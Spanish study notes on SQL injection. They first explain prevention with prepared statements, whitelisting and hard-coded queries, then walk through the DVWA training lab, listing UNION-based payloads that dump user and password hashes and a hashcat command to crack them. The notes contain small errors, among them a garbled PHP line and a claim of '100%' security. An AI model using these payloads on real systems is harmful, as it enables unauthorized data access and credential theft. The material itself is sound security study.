Puedes prevenir la mayoría de los casos de inyección SQL utilizando **consultas parametrizadas** en lugar de concatenar cadenas de texto dentro de la consulta. Estas consultas parametrizadas también se conocen como **"prepared statements"** (sentencias preparadas).

El siguiente código es **vulnerable** a la inyección SQL porque la entrada del usuario se concatena directamente en la consulta:

```java
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

Puedes reescribir este código de una manera que **evite** que la entrada del usuario interfiera con la estructura de la consulta:

```java
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

Puedes utilizar consultas parametrizadas en cualquier situación donde la entrada no confiable aparezca como **datos** dentro de la consulta, incluyendo la cláusula `WHERE` y los valores en una sentencia `INSERT` o `UPDATE`. Sin embargo, **no se pueden utilizar** para manejar entradas no confiables en otras partes de la consulta, como los nombres de tablas o columnas, o en la cláusula `ORDER BY`. Las funciones de la aplicación que introduzcan datos no confiables en estas partes de la consulta deben adoptar un enfoque diferente, tal como:

* **Listas blancas (Whitelisting):** Permitir únicamente valores de entrada específicos y autorizados.
* **Lógica alternativa:** Utilizar una lógica de programación diferente para lograr el comportamiento requerido sin alterar dinámicamente la consulta.

Para que una consulta parametrizada sea eficaz a la hora de prevenir la inyección SQL, la cadena de texto (*string*) que se utiliza en la consulta **debe ser siempre una constante grabada a fuego (hard-coded)** en el código. Nunca debe contener datos variables de ningún origen. No caigas en la tentación de decidir caso por caso si un dato es "confiable" para seguir utilizando la concatenación de cadenas en los casos que consideres seguros. Es sumamente fácil cometer errores sobre el origen real de los datos, o que cambios en otras partes del código terminen contaminando datos que antes se consideraban seguros.

**En resumen**

El **`?`** le quita a la base de datos la capacidad de "interpretar" el código. Obliga al sistema a tratar absolutamente todo lo que meta el usuario como **texto plano literal** (un simple _string_), sin importar si contiene comillas, guiones, palabras como `SELECT`, `UNION` o cualquier otro truco de hackeo.

- **Concatenación (`+` o `||`):** La base de datos recibe texto + comandos mezclados. El peligro es alto.
- **Parametrización (`?`):** La base de datos recibe la estructura fija por un lado y la entrada del usuario como **texto plano** por el otro. Seguridad del 100%.

Los peligros:

**No puedes** usar un `?` para definir partes estructurales de la consulta, como:

- Nombres de tablas (`SELECT * FROM ?`)
- Nombres de columnas (`SELECT ? FROM users`)
- El orden de los datos (`ORDER BY ?`)

¿Cómo se previene la inyección SQL en esos casos especiales?

1. **Listas blancas (Whitelisting):** El código de la aplicación (en Java, PHP, etc.) intercepta lo que escribe el usuario y lo comprueba con un filtro estricto:
    - _¿El usuario ha escrito "precio"?_ -> El código escribe en el SQL la palabra fija `ORDER BY precio`.
    - _¿El usuario ha escrito "fecha"?_ -> El código escribe en el SQL la palabra fija `ORDER BY fecha`.
    - _¿El usuario ha escrito cualquier otra cosa extraña o un payload SQL?_ -> El código da un error y bloquea la petición.
2. **Lógica alternativa:** Usar variables internas del propio lenguaje de programación para decidir el flujo de la consulta en lugar de dejar que el usuario toque directamente el texto que va hacia la base de datos.

Muchos programadores cometen el error de pensar: _"Bueno, como este dato viene de mi propia base de datos interna y no del navegador del usuario, es seguro, así que aquí sí voy a usar la concatenación normal con el signo `+`"_.

Eso es un error gravísimo que causa las **Inyecciones SQL de Segundo Orden**.

---

**La cadena de la consulta SQL original debe estar grabada a fuego (hard-coded) como una constante en el código.**

Significa que la base de la consulta SQL la debe escribir el programador directamente en el editor de código y nunca debe cambiar ni modificarse sobre la marcha mientras la aplicación se está ejecutando

Ejemplo de mala configuración:

```
String miTabla = obtenerTablaDesdeElNavegador(); // El usuario puede alterar esto
String query = "SELECT * FROM " + miTabla + " WHERE id = ?"; 
```

Ejemplo buena configuración:

```
// Esto es una constante grabada a fuego. No cambia jamás.
final String QUERY_PRODUCTOS = "SELECT * FROM products WHERE id = ?"; 

PreparedStatement statement = connection.prepareStatement(QUERY_PRODUCTOS);
statement.setInt(1, idUsuario);
```

---
# DVWA

## LOW LEVEL

Hay que modificar el campo del `ID`,el cual es numérico del 1-5.
### Fallos:

- `1' or 1=1` -> `'1' or 1=1'` Como vemos queda una comilla suelta por lo que tenemos dos opciones:

1. `1' or '1'='1` -> `1' or '1'='1'` Quedan todas las comillas cerradas.
2. `1' or 1=1-- -` -> `1' or 1=1-- -'`La última comilla queda comentada.

- Necesario poner todo en formato URL.

### Pasos:

1. `'`
2. `or 1=1`
3. `order by`
4. `union select version_BBDD, null` Ejemplo: `@@version`
5. Nombre de la base de datos donde me encuentro. Ejemplo: `1' union select database(), null-- -`
6. Ver el nombre de las tablas filtrando por la base de datos donde nos encontramos. Ejemplo: `1' union select table_name, null from information_schema.tables where table_schema='dvwa' -- -`
7. Ver columnas. Ejemplo: `1' union select column_name, null from information_schema.columns where table_name='users`-- -
8. Obtuvimos las columnas `password, user`, lo siguiente es obtener esos datos. Ejemplo: `1' union select user,password form users-- -`
9. Por ultimo podemos descifrar el hash.
`echo (aqui_pegamos_el_hash) > hash.txt`
Descomprimimos `rockyou.txt.gz` con el comando `sudo gzip -d ruta_rockyou.txt.gz`
Usamos `hashcat -m 0 ruta_hash.txt ruta_rockyou.txt`

---
## MEDIUM LEVEL

Observamos el código PHP y vemos que no permite el uso de comillas en la variable `$id`

`$id = mysqli_real_escape_string($GLOBALS("_msqli_ston"$id);`

Esta función implícita añade `\` para escapar, delante de:

`\o, \n, \r, \, ', ", \xla`

- Homólogo moderno multibases: `PDO::quote()`
- Homólogo en `PostgreSQL` es `pg_scape_string()`


### Pasos:

Recordemos que no podemos usar comillas, y que se espera un número entero, por lo que no se ponen las comillas automáticamente en la base de datos.

1. `1 or 1=1-- -` o `1 or 1=1`
2. `1 order by 2-- -`
3. `1 union select database(), null-- -`
4. `1 union select table_name, null from information_schema.tables where table_schema = 0x...-- -`
(Recordamos que todo lo que va después del `where` hay que ponerlo entre comillas pero como no podemos usamos el sistema hexadecimal, el cuál ya indica a la base de datos que es un texto por lo que sabe que va entre comillas aunque no las pongamos.)
5. `1 union select column_name, null from information_schema.columns where table_name = 0x...-- -`
6. `1 union select user, password from users-- -`


---

#SQLi #OAST #DVWA #PortSwigger #BurpSuite


